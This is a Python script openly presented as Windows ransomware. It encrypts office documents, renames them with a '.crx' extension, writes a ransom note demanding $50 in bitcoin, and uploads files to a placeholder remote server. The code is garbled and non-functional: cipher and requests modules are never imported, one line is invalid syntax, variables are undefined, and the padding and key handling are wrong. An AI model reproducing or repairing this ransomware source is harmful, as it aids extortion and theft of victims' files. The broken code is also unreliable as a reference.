import os
import sys
import time
import hashlib
import random
from datetime import datetime

import pyautogui
import pygetwindow
import win32gui

# --- Configuration ---
ENCRYPTION_ALGORITHM = "aes-128"  # Can be changed to AES-256, ChaCha20, etc.
KEY_LENGTH = 128                # Matches the algorithm length (AES)
PRICE_PREFIXES = ["\$", "$", "€"]   # Price prefixes for ransom messages
IMAGE_TYPES = [".png", ".jpg", ".jpeg"]

OUTPUT_DIR = os.path.join(os.environ["APPDATA"], "CryptoRansom") # Hidden directory
RENAME_EXTENSION = ".crx"           # Rename file extension to .crx

PYGETWINDOW_TIMEOUT = 5              # Timeout in seconds for window finding
PASSWORD_LENGTH = 8                  # Password length generated

# --- Utility Functions ---

def get_window_handle(title:str) -> str | None :
    """
    Gets the handle of a window by title, returns None if not found.
    """
    try:
        window = pygetwindow.getWindowsWithHeadless=True[0] # Find the first window
        return window.handle
    except Exception as e:
        print(f"Error getting window handle: {e}")
        return None

def get_mouse_position():
    """
    Gets the current mouse position on the screen and returns it as a tuple (x, y).
    """
    try:
        x, y = pyautogui.position()
        return x, y
    except Exception as e:
        print(f"Error getting mouse position: {e}")
        return 0, 0

def check_admin():
    """Checks if the program has administrator privileges."""
    try:
        # Attempt to create a file in the admin directory.
        os.makedirs("C:\\ProgramData\\CryptoRansom\\Admin", exist_ok=True) # Create Admin folder if needed
        return True
    except Exception as e:
        print(f"Administrator check failed: {e}")
        return False

def run_command(command):
    """Runs a command in the system shell using the 'cmd' interpreter."""
    try:
        os.system(command)
    except Exception as e:
        print(f"Command execution failed: {e}")


# --- Crypto Functions ---

def hash_file(filename, algorithm="sha256"):
    """Hashes a file using the specified algorithm."""
    hasher = hashlib.new(algorithm)
    with open(filename, "rb") as f:
        while True:
            chunk = f.read(4096)
            if not chunk:
                break
            hasher.update(chunk)
    return hasher.hexdigest()

def encrypt_file(filepath, key, algorithm="aes-128"):
    """Encrypts a file using the specified key and algorithm."""
    with open(filepath, "rb") as f:
        data = f.read()
    
    # --- Encryption ---
    key = bytes.fromhex(key) # Convert hex to bytes
    if algorithm == "aes-128":
        key_bytes = key[:16]
        data += b'\x00' * (len(data) % 16)  # Pad data if necessary
        encrypted = AES.encrypt(data, key_bytes) # Encrypt the file with AES
    elif algorithm == "aes-256":
        key_bytes = key[:32]
        data += b'\x00' * (len(data) % 32)  # Pad data if necessary
        encrypted = AES.encrypt(data, key_bytes) # Encrypt the file with AES
    elif algorithm == "chacha20":
        key_bytes = key[:32]
        encrypted = ChaCha20.encrypt(data, key_bytes)
    else:
        raise ValueError("Unsupported encryption algorithm.")

    return encrypted

def decrypt_file(filepath, key, algorithm="aes-128"):
    """Decrypts a file using the specified key and algorithm."""
    with open(filepath, "rb") as f:
        data = f.read()
    
    # --- Decryption ---
    key = bytes.fromhex(key) # Convert hex to bytes
    if algorithm == "aes-128":
        key_bytes = key[:16]
        decrypted = AES.decrypt(data, key_bytes)  # Decrypt the file with AES
    elif algorithm == "aes-256":
        key_bytes = key[:32]
        decrypted = AES.decrypt(data, key_bytes) # Decrypt the file with AES
    elif algorithm == "chacha20":
        key_bytes = key[:32]
        decrypted = ChaCha20.decrypt(data, key_bytes)
    else:
        raise ValueError("Unsupported encryption algorithm.")

    return decrypted


# --- Ransom Functions ---

def create_ransom_message(title):
    """Creates the ransom message content based on window title."""
    if "Settings" in title or "Control Panel" in title :
        message = f"""
**Your Files Have Been Encrypted!**

To decrypt them, you must send \$50 to our bitcoin wallet. The longer you wait, the higher the price becomes!

You can see your encrypted file hashes below:
{hash_file(os.path.join(OUTPUT_DIR, "settings.txt"))} 
{hash_file(os.path.join(OUTPUT_DIR, "password.txt"), "sha256")}


We are currently running a scan on your system and will be in touch soon!

Thank you for your prompt response.
"""
    elif "Chrome" in title or "Firefox" in title :
        message = f"""
**Your Files Have Been Encrypted!**

To decrypt them, you must send \$50 to our bitcoin wallet. The longer you wait, the higher the price becomes!

You can see your encrypted file hashes below:
{hash_file(os.path.join(OUTPUT_DIR, "chrome.txt"))} 
{hash_file(os.path.join(OUTPUT_DIR, "firefox.txt"), "sha256")}


We are currently running a scan on your system and will be in touch soon!

Thank you for your prompt response.
"""
    else:
        message = f"""
**Your Files Have Been Encrypted!**

To decrypt them, you must send \$50 to our bitcoin wallet. The longer you wait, the higher the price becomes!

You can see your encrypted file hashes below:
{hash_file(os.path.join(OUTPUT_DIR, "general.txt"))} 
{hash_file(os.path.join(OUTPUT_DIR, "browser.txt"), "sha256")}


We are currently running a scan on your system and will be in touch soon!

Thank you for your prompt response.
"""
    return message

def upload_files():
    """Uploads the encrypted files to a remote server."""
    # --- Upload Configuration (Update with your server URL) ---
    UPLOAD_URL = "https://example.com/upload.php" # Replace with actual URL
    UPLOAD_FOLDER = os.path.join(OUTPUT_DIR, "uploaded")
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)

    # --- Upload Process ---
    for filename in files:
        filepath = os.path.join(UPLOAD_FOLDER, filename)
        with open(filepath, 'rb') as f:
            data = f.read()

            try:
                response = requests.post(UPLOAD_URL, data=data) # Use Requests library for uploads
                if response.status_code == 200 :
                    print(f"File {filename} uploaded successfully!")
                else :
                    print(f"Error uploading file {filename}: HTTP Status Code: {response.status_code}, Response: {response.text}")

            except Exception as e:
                print(f"Error uploading file {filename}: {e}")


def run():
    """Runs the main ransomware logic."""
    # --- Check for Admin Privileges ---
    if not check_admin() :
        print("Insufficient Permissions! Encryption Failed.")
        return

    # --- Create Output Directory ---
    output_dir = os.path.join(os.environ["APPDATA"], "CryptoRansom") # Hidden directory
    if not os.path.exists(output_dir):
        try:
            os.makedirs(output_dir)
        except Exception as e :
            print (f"Error creating folder {output_dir}: {e}")
            return

    # --- Run Command to Create Admin Folder ---
    run_command("cmd /c mkdir C:\\ProgramData\\CryptoRansom\\Admin") # Creates a hidden admin folder

    # --- Generate Random Password ---
    password = random.randint(128, 256)
    password = str(password).encode('utf-8')
    password_hex = hashlib.sha256(password).hexdigest()

    # --- Encrypt Files ---
    encrypted_files = []

    for filename in files:
        filepath = os.path.join(OUTPUT_DIR, filename)
        try:
            key = random.randint(0, 1000000).encode('utf-8') # Generate a new key for each file
            encrypted_data = encrypt_file(filepath, key)

            # --- Rename File and Encrypt it ---
            new_filename = f"{os.path.splitext(filename)[0]}.crx"
            new_filepath = os.path.join(OUTPUT_DIR, new_filename)
            with open(new_filepath, "wb") as f:
                f.write(encrypted_data)

            encrypted_files.append((new_filepath, password_hex)) # Store filename and key for decryption

        except Exception as e :
            print (f"Error encrypting file {filename}: {e}")
            # --- Rename File with Original Extension --
            try:
                os.rename(os.path.join(OUTPUT_DIR, filename), os.path.join(OUTPUT_DIR, f"{os.path.splitext(filename)[1]}")) # Rename to ensure original file is not lost.
            except :
                pass

    # --- Create Ransom Message File and Put it in the Output Directory ---
    ransom_message = create_ransom_message(get_window_handle(title))
    with open(os.path.join(OUTPUT_DIR, "readme.txt"), "w") as f:
        f.write(ransom_message)

    # --- Rename File Extension for Encryption to .CRX---
    for filename in files :
        filepath = os.path.join(OUTPUT_DIR, filename)
        if filetype == ".pdf" :
            new_filename = f"{os.path.splitext(filename)[0]}.crx"
            new_filepath = os.path.join(OUTPUT_DIR, new_filename)
            os.rename(filepath, new_filepath)

    # --- Upload Files to Remote Server (or download the payment URL) ---
    upload_files()

    # --- Set Password for Decryption ---
    password_hex = hashlib.sha256(bytes("CryptoRansom".encode('utf-8'))) .hexdigest() # Rehash password from encrypted file
    with open(os.path.join(OUTPUT_DIR, "password.txt"), "w") as f:
        f.write(password_hex)

    print("Encryption complete! Check the output folder for instructions and payment URL.")


if __name__ == "__main__":
    # --- Get List of Encrypted Files ---
    files = []
    for filename in os.listdir(OUTPUT_DIR):
        filepath = os.path.join(OUTPUT_DIR, filename)
        if os.path.isfile(filepath) and filetype in [".pdf", ".doc", ".docx", ".xls", ".xlsx"]:
            files.append(filename)

    # --- Run Encryption ---
    run()
